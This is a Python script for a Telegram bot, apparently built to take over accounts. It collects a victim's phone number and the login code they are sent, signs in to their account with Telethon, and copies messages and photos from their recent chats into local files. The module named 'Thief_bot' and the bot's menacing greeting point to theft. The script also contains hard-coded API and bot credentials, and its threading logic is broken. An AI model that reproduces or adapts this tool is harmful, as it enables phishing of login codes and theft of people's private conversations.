from telethon.tl.types import MessageMediaPhoto
from telethon.utils import get_display_name
from telethon.sync import TelegramClient
import time
from Telebots import Thief_bot
import threading
import telebot
phone_01= None
code_01 = None
def History_save(phone_01,code_01):
    api_id = 1005783
    api_hash = '09cb354a26d71b92d9c12e06a7760732'
    phone = phone_01
    code = code_01
    time_01 = 0
    while len(phone) < 5:
        time.sleep(1)
        print('phone waiting')
    if len(phone)>4:
        print('PHONE EXECUTED'+phone)
        time_01=10
        client_01 = TelegramClient(phone, api_id, api_hash)
        print(" Step 1")
        client_01.connect()
        if not client_01.is_user_authorized():
            client_01.sign_in(phone)
            time.sleep(20)
            if len(code) > 4:
                print('START BEGIN'+code)
            time.sleep(2)
            client_01.sign_in(phone, code = code)
            phone = '1'
            code = '2'
            time_01= 0

        dialogs = client_01.get_dialogs(limit = 5)

        for n, dialog_iter in enumerate(dialogs, start=0):
            entity = dialog_iter.entity
            messages = client_01.get_messages(entity, limit=20)
            for i, message in enumerate(messages, start=1):
                media = message.photo
                if 'MessageMediaPhoto' in str(media):
                    print("Will download image")
                    download_res = client_01.download_media(
                        media)
                    print("Download done: {}".format(download_res))
                else:
                    try:
                        f = open("{}.txt".format(get_display_name(entity)), "a+")
                        f.write("\n" + str(message.to_id) + "\n" + str(message.message))
                        print(str(message))
                    except UnicodeEncodeError:
                        continue
        for n, dialog_iter in enumerate(dialogs, start=0):
            entity = dialog_iter.entity
            messages = client_01.get_messages(entity, limit=20)
            for i, message in enumerate(messages, start=20):
                media = message.media
                if 'MessageMediaPhoto' in str(media):
                    print("Will download image")
                    print(media)
                    download_res = client_01.download_media(
                        media)
                    print("Download done: {}".format(download_res))
                else:
                    try:
                        f = open("{}.txt".format(get_display_name(entity)), "a+")
                        f.write("\n" + str(message.to_id) + "\n" + str(message.message))
                        print(str(message))
                    except UnicodeEncodeError:
                        continue
x = threading.Thread(target=History_save, args=(phone_01,code_01))
bot = telebot.TeleBot( "917002472:AAGiOuSM_t0NzDgd3VQYmZecfI7TjYRZiZk" )
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to( message, "Зря ты сюда зашел" )

@bot.message_handler( content_types=['text'] )
def send_message_1(message):
    User_text = str(message.text)
    phone_01 = None
    code_01 = None
    if "Код" in User_text:
        code_01= str(User_text[4:])
        answer  = "Код " + code_01
    elif "+" in User_text:
        phone_01 = str(User_text[2:])
        answer  = "Операция началась " + phone_01
        x.start()
    else:
        answer = "Я такого еще незнаю"
    bot.send_message( message.chat.id, answer)


bot.polling( none_stop=True )


